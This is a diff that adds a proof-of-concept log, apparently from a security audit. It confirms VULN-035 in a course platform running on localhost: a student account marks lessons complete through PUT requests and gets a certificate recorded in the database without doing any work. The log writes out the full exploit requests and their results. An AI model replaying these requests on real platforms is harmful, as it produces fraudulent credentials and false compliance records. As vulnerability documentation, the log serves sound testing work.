@@ -1,0 +1,15 @@
+========================================================================
+VULN-035: Client-asserted lesson completion -> self-issued certificate
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] upsertLessonCompletionService (lesson.ts:412-433) writes body.isComplete verbatim
+[SETUP] course=6da34ade-de37-4a92-a151-b1d6a0756e95 certificate enabled (threshold=100, no requiredExerciseId) -> 200
+[SETUP] added 2 lessons (no exercises): ['2c844eb4-3818-43dd-a47a-42289f84a68e', '471b2998-27b8-4b60-bea3-03d89c24b54b']
+[SETUP] attacker STUDENT cab77ae7-6a46-461e-a819-8a97d7a5a433 enrolled; does NO real work
+[STEP] PUT /course/6da34ade-de37-4a92-a151-b1d6a0756e95/lesson/2c844eb4-3818-43dd-a47a-42289f84a68e/completion {isComplete:true} -> 200
+[STEP] PUT /course/6da34ade-de37-4a92-a151-b1d6a0756e95/lesson/471b2998-27b8-4b60-bea3-03d89c24b54b/completion {isComplete:true} -> 200
+[STEP] GET /course/6da34ade-de37-4a92-a151-b1d6a0756e95/certification-evaluation -> progress=100% eligible=True certificateEarnedAt=2026-09-27T14:50:25.965Z
+[INFO] DB groupmember.certificate_earned_at = '2026-09-27 14:50:25.958+00'
+[PROOF] attacker self-declared 2 lesson completions (no exercises, no video watch) -> progress 100%, eligibleForCertificate=true, and groupmember.certificateEarnedAt was stamped in the DB (2026-09-27 14:50:25.958+00) — a real certificate earned with zero work
+==> VULN-035: CONFIRMED — self-declared completion issues a genuine certificate / fake compliance record
+[OK] exploit confirmed — certification consumes client-asserted completion directly
